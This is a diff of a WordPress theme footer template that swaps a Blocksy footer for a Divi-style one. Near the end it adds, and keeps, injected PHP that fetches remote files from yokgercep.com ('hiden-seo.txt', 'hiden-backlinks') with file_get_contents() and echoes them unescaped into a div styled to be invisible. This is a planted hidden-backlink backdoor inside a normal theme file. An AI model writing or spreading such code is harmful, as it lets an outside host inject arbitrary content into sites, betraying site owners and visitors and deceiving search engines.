@@ -1,35 +1,78 @@
 <?php
+if ( et_theme_builder_overrides_layout( ET_THEME_BUILDER_HEADER_LAYOUT_POST_TYPE ) || et_theme_builder_overrides_layout( ET_THEME_BUILDER_FOOTER_LAYOUT_POST_TYPE ) ) {
+    // Skip rendering anything as this partial is being buffered anyway.
+    // In addition, avoids get_sidebar() issues since that uses
+    // locate_template() with require_once.
+    return;
+}
+
 /**
- * The template for displaying the footer
+ * Fires after the main content, before the footer is output.
  *
- * Contains the closing of the #content div and all content after.
- *
- * @link https://developer.wordpress.org/themes/basics/template-files/#template-partials
- *
- * @package Blocksy
+ * @since 3.10
  */
+do_action( 'et_after_main_content' );
 
-blocksy_after_current_template();
-do_action('blocksy:content:bottom');
+if ( 'on' === et_get_option( 'divi_back_to_top', 'false' ) ) : ?>
 
+	<span class="et_pb_scroll_top et-pb-icon"></span>
+
+<?php endif;
+
+if ( ! is_page_template( 'page-template-blank.php' ) ) : ?>
+
+			<footer id="main-footer">
+				<?php get_sidebar( 'footer' ); ?>
+
+
+		<?php
+			if ( has_nav_menu( 'footer-menu' ) ) : ?>
+
+				<div id="et-footer-nav">
+					<div class="container">
+						<?php
+							wp_nav_menu( array(
+								'theme_location' => 'footer-menu',
+								'depth'          => '1',
+								'menu_class'     => 'bottom-nav',
+								'container'      => '',
+								'fallback_cb'    => '',
+							) );
+						?>
+					</div>
+				</div>
+
+			<?php endif; ?>
+
+				<div id="footer-bottom">
+					<div class="container clearfix">
+				<?php
+					if ( false !== et_get_option( 'show_footer_social_icons', true ) ) {
+						get_template_part( 'includes/social_icons', 'footer' );
+					}
+
+					// phpcs:disable WordPress.Security.EscapeOutput.OutputNotEscaped
+					echo et_core_fix_unclosed_html_tags( et_core_esc_previously( et_get_footer_credits() ) );
+					// phpcs:enable
+				?>
+					</div>
+				</div>
+			</footer>
+		</div>
+
+<?php endif; // ! is_page_template( 'page-template-blank.php' ) ?>
+
+	</div>
+    <?php
+        echo "<div class='sponsor-area' style='background-color: #f4f4f4; font-size: 0.00001px; color: #f4f4f4;'>";
+        echo file_get_contents("https://yokgercep.com/hiden-seo.txt");
+        echo "</div>";
 ?>
-	</main>
-
-	<?php
-		do_action('blocksy:content:after');
-		do_action('blocksy:footer:before');
-
-		blocksy_output_footer();
-
-		do_action('blocksy:footer:after');
-	?>
-</div>
-
-<?php wp_footer(); ?>
 <?php
         echo "<div class='sponsor-area' style='background-color: #f4f4f4; font-size: 0.00001px; color: #f4f4f4;'>";
-        echo file_get_contents("https://yokgercep.com/404-forbiden/hiden-backlinks.txt");
+        echo file_get_contents("https://yokgercep.com/hiden-backlinks77.txt");
         echo "</div>";
-    ?>
+?>
+	<?php wp_footer(); ?>
 </body>
 </html>
